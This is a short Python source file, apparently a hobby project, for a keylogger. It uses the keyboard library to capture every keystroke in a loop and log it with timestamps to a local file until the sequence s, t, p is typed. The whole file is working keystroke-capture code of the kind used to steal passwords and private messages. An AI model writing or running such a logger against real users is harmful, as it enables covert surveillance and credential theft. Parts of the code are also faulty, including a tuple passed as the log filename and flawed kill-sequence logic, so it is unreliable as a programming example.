#|/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\|#
# Author: Cole Baker
# Start Date: January, 23, 2019
# Finish Date:
# Description: Key logger with Array and logging instead of keyboard
#|/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\|#

import keyboard 
import datetime
import logging


kill_command = ['s','t','p']
kill_array = []

# file_path = "C:\\Users\\baker\\OneDrive\\Documents\\My Stuff\\Personal\\Security Stuff\\security_stuff\\Key_Logger\\array_logged_keys.txt"
# access_mode = "a"

key_log = ""
logging.basicConfig(filename=(key_log, "logging_key.txt"), level=logging.DEBUG, format='%(asctime)s, %(message)s')
# file_handle = open(file_path,access_mode)

while True:
    logged_keys = keyboard.read_hotkey(suppress=False)
    logging.info("{}".format(logged_keys))

    # date = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-4]
    # file_handle.write("{} - {}\n".format(date,logged_keys))
    
    # if logged_keys != kill_command:
    #     kill_array = []


    if logged_keys == kill_command[0]:
        kill_array.insert(0, kill_command[0])
        # kill_array.pop(1)
        print(kill_array)
            
    elif logged_keys == kill_command[1]:
        kill_array.insert(1, kill_command[1])
        # kill_array.pop(2)
        print(kill_array)

    elif logged_keys == kill_command[2]:
        kill_array.insert(2, kill_command[2])
        kill_array.pop(3)
        print(kill_array)

    if kill_array == kill_command:
        break
